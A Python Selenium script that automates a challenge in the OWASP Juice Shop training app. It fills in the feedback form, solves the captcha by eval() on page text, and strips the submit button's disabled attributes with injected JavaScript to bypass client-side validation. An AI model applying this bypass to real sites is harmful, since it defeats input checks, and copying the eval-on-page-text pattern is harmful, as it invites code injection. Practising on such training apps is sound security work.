from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os
import time

try:
	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
	driver = webdriver.Chrome()

	#User loads website in browser
	driver.get(f"http://{IP_ADDRESS}:{PORT}")
	
	#User navigates to customer feedback page
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'menu')]"))).click()
	customerFeedbackButton = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//a[contains(., 'Customer Feedback')]")))
	driver.execute_script("arguments[0].click();", customerFeedbackButton)

	#User writes comment	
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "comment"))).send_keys("test")

	#User solves captcha
	captchaAnswer = eval(WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "captcha"))).text)
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "captchaControl"))).send_keys(captchaAnswer)

	#User edits HTML to enable submit button
	submitButton = WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.ID, "submitButton")))
	classToRemove = "mat-mdc-button-disabled"
	disableAttribute = "disabled"
	matDisable = "mat-ripple-loader-disabled"
	driver.execute_script(f"arguments[0].classList.remove('{classToRemove}');", submitButton)
	driver.execute_script(f"arguments[0].removeAttribute('{disableAttribute}');", submitButton)
	driver.execute_script(f"arguments[0].removeAttribute('{matDisable}');", submitButton)
	driver.execute_script("arguments[0].click();", submitButton)
	
finally:
  driver.quit()
